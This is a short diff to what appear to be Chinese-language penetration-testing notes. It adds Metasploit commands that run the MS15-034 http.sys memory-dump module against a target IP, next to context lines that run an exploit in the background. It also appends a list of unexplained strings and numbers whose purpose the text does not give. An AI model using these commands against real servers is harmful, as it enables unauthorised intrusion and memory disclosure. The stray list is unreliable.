@@ -633,13 +633,41 @@ set LPORT
 exploit -j  # 后台执行
 ```
 
+**ms15-034**
+```bash
+use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
+set rhost ip
+run
+```
 
 
 
 
 
-
-
-
+demo
+manager
+1828
+5643
+3403
+1635
+1649
+1660
+1663
+1667
+1756
+1918
+L067
+L1172
+L1180
+L1182
+L1210
+L122
+L123
+L125
+L1509
+L1512
+L1591
+L1600
+L1626
 
 
